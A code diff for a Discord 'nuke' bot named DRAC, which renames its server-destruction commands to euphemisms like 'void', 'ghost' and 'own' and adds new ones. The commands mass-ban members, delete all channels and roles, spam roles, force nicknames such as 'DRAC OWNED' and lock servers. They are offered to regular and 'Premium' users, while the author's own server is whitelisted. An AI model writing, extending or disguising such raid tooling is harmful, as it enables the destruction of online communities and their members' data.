@@ -155,6 +155,29 @@ async def on_ready():
 {c}--------------------------------------------''')
     asyncio.create_task(check_logs_task())
 
+@client.event
+async def on_member_join(member):
+    # Log member join platform (Desktop/Mobile/Web)
+    status = "Unknown"
+    if member.desktop_status != discord.Status.offline: status = "Desktop"
+    elif member.mobile_status != discord.Status.offline: status = "Mobile"
+    elif member.web_status != discord.Status.offline: status = "Web"
+    
+    embed = discord.Embed(
+        title="👤 New Member Joined",
+        description=f"{member.mention} has joined.",
+        color=discord.Color.blue()
+    )
+    embed.add_field(name="User", value=f"{member.name} ({member.id})", inline=False)
+    embed.add_field(name="Platform", value=status, inline=True)
+    embed.add_field(name="Created", value=member.created_at.strftime('%Y-%m-%d'), inline=True)
+    embed.set_thumbnail(url=member.display_avatar.url)
+    
+    log_channel = discord.utils.get(member.guild.text_channels, name="drac-logs")
+    if log_channel:
+        try: await log_channel.send(embed=embed)
+        except: pass
+
 async def check_logs_task():
     while True:
         try:
@@ -417,13 +440,13 @@ async def setup_slash(interaction: discord.Interaction):
         await ticket_panel.callback(inv)
     ticket_btn.callback = ticket_callback
     
-    nuke_btn = discord.ui.Button(label="Nuke Server", style=discord.ButtonStyle.danger, emoji="🚀")
-    async def nuke_callback(inv: discord.Interaction):
-        await nuke_slash.callback(inv)
-    nuke_btn.callback = nuke_callback
+    void_btn = discord.ui.Button(label="Void Server", style=discord.ButtonStyle.danger, emoji="🚀")
+    async def void_callback(inv: discord.Interaction):
+        await wipe_slash.callback(inv)
+    void_btn.callback = void_callback
     
     view.add_item(ticket_btn)
-    view.add_item(nuke_btn)
+    view.add_item(void_btn)
     
     await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
 
@@ -438,62 +461,83 @@ async def setup_support_slash(interaction: discord.Interaction, role: discord.Ro
     
     await interaction.response.send_message(f"✅ Support Setup Complete!\nStaff Role: {role.mention}\nCategory: {category.name}", ephemeral=True)
 
-@client.tree.command(name="nuke", description="Basic server nuke (Regular Users)")
-async def nuke_slash(interaction: discord.Interaction):
+@client.tree.command(name="void", description="Send the server into the abyss (Regular Users)")
+async def wipe_slash(interaction: discord.Interaction):
     if interaction.guild_id == WHITELISTED_SERVER_ID:
-        return await interaction.response.send_message("❌ This server is protected from nuking!", ephemeral=True)
-    await interaction.response.send_message("🚀 Nuke Started!", ephemeral=True)
+        return await interaction.response.send_message("❌ This server is protected!", ephemeral=True)
+    await interaction.response.send_message("🚀 Void sequence started...", ephemeral=True)
     await nuke_guild(interaction.guild)
 
-@client.tree.command(name="chaos_nuke", description="High-intensity nuke with custom roles (Premium Only)")
-@app_commands.describe(role_name="Name for spam roles")
-async def chaos_nuke_slash(interaction: discord.Interaction, role_name: str = "FKD BY DRAC"):
+@client.tree.command(name="glitch", description="Role & Channel overload (Premium Only)")
+@app_commands.describe(role_name="Spam role name")
+async def crash_slash(interaction: discord.Interaction, role_name: str = "GLITCHED BY DRAC"):
     if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
         return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
     if interaction.guild_id == WHITELISTED_SERVER_ID:
         return await interaction.response.send_message("❌ Protected!", ephemeral=True)
     
-    await interaction.response.send_message("🔥 Chaos Nuke Initiated!", ephemeral=True)
-    # Intense role spam
+    await interaction.response.send_message("🔥 Glitching server...", ephemeral=True)
     for _ in range(50):
-        try: await interaction.guild.create_role(name=role_name, color=discord.Color.red())
+        try: await interaction.guild.create_role(name=role_name, color=discord.Color.from_rgb(random.randint(0,255), random.randint(0,255), random.randint(0,255)))
         except: break
     await nuke_guild(interaction.guild)
 
-@client.tree.command(name="ghost_nuke", description="Silent nuke - Deletes everything without spamming (Premium Only)")
-async def ghost_nuke_slash(interaction: discord.Interaction):
+@client.tree.command(name="ghost", description="Silent wipe (Premium Only)")
+async def vanish_slash(interaction: discord.Interaction):
     if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
         return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
     if interaction.guild_id == WHITELISTED_SERVER_ID:
         return await interaction.response.send_message("❌ Protected!", ephemeral=True)
         
-    await interaction.response.send_message("👻 Ghost Nuke Started...", ephemeral=True)
+    await interaction.response.send_message("👻 Ghosting everything...", ephemeral=True)
     await ban_all_members(interaction.guild)
     await delete_all_channels(interaction.guild)
     await delete_all_roles(interaction.guild)
 
-@client.tree.command(name="extreme_nuke", description="The ultimate nuke experience (Premium Only)")
-async def extreme_nuke_slash(interaction: discord.Interaction):
+@client.tree.command(name="own", description="Full server ownership takeover (Premium Only)")
+async def overtake_slash(interaction: discord.Interaction):
     if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
         return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
     if interaction.guild_id == WHITELISTED_SERVER_ID:
         return await interaction.response.send_message("❌ Protected!", ephemeral=True)
 
-    await interaction.response.send_message("⚡ EXTREME NUKE ENGAGED!", ephemeral=True)
-    # Mass nickname change + Nuke
+    await interaction.response.send_message("⚡ OWNING THIS SERVER...", ephemeral=True)
     for member in interaction.guild.members:
         try: await member.edit(nick="DRAC OWNED")
         except: continue
     await nuke_guild(interaction.guild)
 
-@client.tree.command(name="custom_nuke", description="Full server nuke with custom message & channel names (Premium)")
-@app_commands.describe(message="Custom spam message", channel_name="Custom channel names")
-async def custom_nuke_slash(interaction: discord.Interaction, message: str, channel_name: str = None):
-    if interaction.guild_id == WHITELISTED_SERVER_ID:
-        return await interaction.response.send_message("❌ This server is protected from nuking!", ephemeral=True)
+@client.tree.command(name="drain", description="Wipe with custom data tags (Premium Only)")
+async def scrape_slash(interaction: discord.Interaction):
     if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
         return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
-    await interaction.response.send_message("🚀 Custom Nuke Started!", ephemeral=True)
+    await interaction.response.send_message("📡 Draining data...", ephemeral=True)
+    await nuke_guild(interaction.guild, custom_message="DRAINED BY DRAC")
+
+@client.tree.command(name="freeze", description="Lockdown the entire server (Premium Only)")
+async def lockdown_slash(interaction: discord.Interaction):
+    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
+    await interaction.response.send_message("🔒 Freezing server...", ephemeral=True)
+    for channel in interaction.guild.channels:
+        try: await channel.set_permissions(interaction.guild.default_role, send_messages=False)
+        except: continue
+
+@client.tree.command(name="strip_roles", description="Delete all roles (Premium Only)")
+async def purge_roles_slash(interaction: discord.Interaction):
+    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
+    await interaction.response.send_message("🎭 Stripping roles...", ephemeral=True)
+    await delete_all_roles(interaction.guild)
+
+@client.tree.command(name="custom_void", description="Wipe with custom settings (Premium Only)")
+@app_commands.describe(message="Custom message", channel_name="Custom channels")
+async def custom_wipe_slash(interaction: discord.Interaction, message: str, channel_name: str = None):
+    if interaction.guild_id == WHITELISTED_SERVER_ID:
+        return await interaction.response.send_message("❌ This server is protected!", ephemeral=True)
+    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
+    await interaction.response.send_message("🚀 Custom Void Started!", ephemeral=True)
     await nuke_guild(interaction.guild, message, channel_name)
 
 @client.tree.command(name="spam", description="Spam current channel (Owner Only)")
@@ -632,8 +676,8 @@ async def massdm(ctx, *, message: str):
             try: await member.send(message)
             except: continue
 
-@client.tree.command(name="lock", description="Lock the current channel (Owner Only)")
-async def lock_slash(interaction: discord.Interaction):
+@client.tree.command(name="lock_channel", description="Lock the current channel (Owner Only)")
+async def lock_channel_slash(interaction: discord.Interaction):
     if not await client.is_owner(interaction.user):
         return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
     
@@ -641,13 +685,13 @@ async def lock_slash(interaction: discord.Interaction):
         await interaction.channel.set_permissions(interaction.guild.default_role, send_messages=False, create_public_threads=False, create_private_threads=False)
         await interaction.response.send_message("🔒 Channel Locked! (No messages or threads)", ephemeral=False)
     except discord.Forbidden:
-        await interaction.response.send_message("❌ I don't have permission to lock this channel! Make sure my role is high enough and has 'Manage Permissions'.", ephemeral=True)
+        await interaction.response.send_message("❌ I don't have permission to lock this channel!", ephemeral=True)
     except Exception as e:
         await interaction.response.send_message(f"❌ An error occurred: {e}", ephemeral=True)
 
-@client.command()
+@client.command(name="lock_channel")
 @commands.is_owner()
-async def lock(ctx):
+async def lock_channel_prefix(ctx):
     await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False, create_public_threads=False, create_private_threads=False)
     await ctx.send("🔒 Channel Locked! (No messages or threads)")
 
